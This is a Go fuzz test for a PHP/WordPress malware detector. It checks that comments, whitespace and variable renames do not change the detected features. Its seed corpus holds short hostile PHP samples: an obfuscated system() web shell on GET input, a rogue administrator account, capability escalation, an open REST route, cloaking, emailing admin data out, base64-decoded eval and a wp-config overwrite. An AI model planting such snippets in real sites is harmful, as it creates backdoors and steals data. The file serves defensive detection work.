// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"maps"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/lex/php"
)

// featureKeys is the set of SetKeys of fs.
func featureKeys(fs []core.Feature) []string {
	set := map[string]bool{}
	for _, f := range fs {
		set[f.SetKey()] = true
	}
	return slices.Sorted(maps.Keys(set))
}

// globals are variables a rename must keep: they are not local.
var globals = map[string]bool{"$this": true, "$GLOBALS": true, "$wpdb": true, "$wp_roles": true, "$wp_filesystem": true, "$HTTP_RAW_POST_DATA": true}

var simpleVar = regexp.MustCompile(`^\$[A-Za-z_][A-Za-z0-9_]*$`)

// mutatePHP rewrites src without changing what it means: comments and
// whitespace go between tokens where seed's bits say; local variables
// get new names. It returns "" when src is not a fit (an
// unterminated construct, variable variables, "<<<").
func mutatePHP(src string, seed uint64) string {
	toks := php.Lex([]byte(src))
	// Variable variables defeat renames; a line break after "<<<A"
	// would open a heredoc where there was none.
	if strings.Contains(src, "$$") || strings.Contains(src, "${") || strings.Contains(src, "<<<") {
		return ""
	}
	var lits strings.Builder
	for _, t := range toks {
		switch t.Kind {
		case php.Error:
			return ""
		case php.String, php.InlineHTML, php.Comment, php.Attribute:
			lits.WriteString(t.Text)
			lits.WriteByte(0)
		}
	}
	// Rename the variables whose name appears in no string, comment or
	// HTML (interpolation, compact('name')).
	names := map[string]string{}
	for _, t := range toks {
		if t.Kind != php.Variable || !simpleVar.MatchString(t.Text) || globals[t.Text] || strings.HasPrefix(t.Text, "$_") {
			continue
		}
		if _, ok := names[t.Text]; ok || strings.Contains(lits.String(), t.Text[1:]) {
			continue
		}
		names[t.Text] = "$v" + strconv.Itoa(len(names)) + "_r"
	}
	// Each filler starts with a blank so it never glues onto the token
	// before it: "/" then "/* c */" would read as a line comment.
	fillers := []string{" ", " /* c */ ", "\n", "\t#x\n", " /** d */ ", " // y\n"}
	code := func(k php.Kind) bool {
		switch k {
		case php.InlineHTML, php.OpenTag, php.CloseTag, php.Error:
			return false
		}
		return true
	}
	var b strings.Builder
	r := seed
	halted := false
	for i, t := range toks {
		text := t.Text
		if n, ok := names[text]; ok && t.Kind == php.Variable {
			text = n
		}
		b.WriteString(text)
		if t.Is("__halt_compiler") {
			halted = true
		}
		if halted || i+1 >= len(toks) || !code(t.Kind) || !code(toks[i+1].Kind) {
			continue
		}
		// A small LCG picks about one gap in eight and a filler for it.
		r = r*6364136223846793005 + 1442695040888963407
		if r>>61 != 0 {
			continue
		}
		b.WriteString(fillers[(r>>32)%uint64(len(fillers))])
	}
	return b.String()
}

func FuzzPHPSignals(f *testing.F) {
	for _, s := range []string{
		essentialPlugin,
		`<?php $f = 'sys'.'tem'; $f($_GET['c']);`,
		`<?php wp_insert_user(array('user_login' => 'x', 'role' => 'administrator'));`,
		`<?php $role = get_role('subscriber'); $role->add_cap('manage_options');`,
		`<?php register_rest_route('ep/v1', '/run', array('callback' => 'f', 'permission_callback' => '__return_true'));`,
		`<?php if (strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false) { echo wp_remote_retrieve_body(wp_remote_get($u)); }`,
		"<?php function f() {\n$e = get_option('admin_email');\nwp_mail('x@example.com', 's', $e);\n}",
		`<?php $a = base64_decode($p); $b = $a; eval($b);`,
		`<?php file_put_contents(ABSPATH . 'wp-config.php', $c); add_filter('auto_update_plugin', '__return_false');`,
		"<?php\n$x = 'hi';\neval($x);\n?>\n<p>html</p>\n<?php system($cmd);",
	} {
		f.Add(s, uint64(1))
		f.Add(s, uint64(0x9e3779b97f4a7c15))
	}
	f.Fuzz(func(t *testing.T, src string, seed uint64) {
		if len(src) > 8<<10 {
			return
		}
		mut := mutatePHP(src, seed)
		if mut == "" {
			return
		}
		want := featureKeys(phpFeatures(src))
		got := featureKeys(phpFeatures(mut))
		if !slices.Equal(got, want) {
			t.Errorf("features changed by comments, whitespace or renames\nsrc: %q\nmut: %q\nwant %q\ngot  %q", src, mut, want, got)
		}
	})
}
